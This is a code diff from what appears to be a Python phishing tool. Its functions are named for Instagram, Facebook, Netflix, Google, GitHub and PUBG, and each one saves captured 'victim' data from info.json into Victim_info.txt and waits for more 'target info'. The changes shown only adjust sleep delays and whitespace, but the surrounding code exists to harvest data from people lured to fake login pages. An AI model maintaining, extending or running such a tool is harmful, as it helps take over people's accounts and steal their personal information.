@@ -212,18 +212,18 @@ def instagram():
                     sleep(0.3)
                     print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
                     
-                    sleep(0.5)
+                    sleep(1)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-                    sleep(1)
+
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
                     victim_file.close()
 
-
+                    
                     Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     break
 
@@ -344,11 +344,11 @@ def facebook():
                     sleep(0.3)
                     print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
                     
-                    sleep(0.5)
+                    sleep(1)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-                    sleep(1)
+
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
@@ -477,11 +477,11 @@ def netflix():
                     sleep(0.3)
                     print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
                     
-                    sleep(0.5)
+                    sleep(1)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-                    sleep(1)
+
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
@@ -610,11 +610,11 @@ def Google():
                     sleep(0.3)
                     print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
                     
-                    sleep(0.5)
+                    sleep(1)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-                    sleep(1)
+
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
@@ -742,11 +742,11 @@ def Github():
                     sleep(0.3)
                     print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
                     
-                    sleep(0.5)
+                    sleep(1)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-                    sleep(1)
+
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
@@ -873,11 +873,11 @@ def Pubg():
                     sleep(0.3)
                     print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
                     
-                    sleep(0.5)
+                    sleep(1)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-                    sleep(1)
+
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
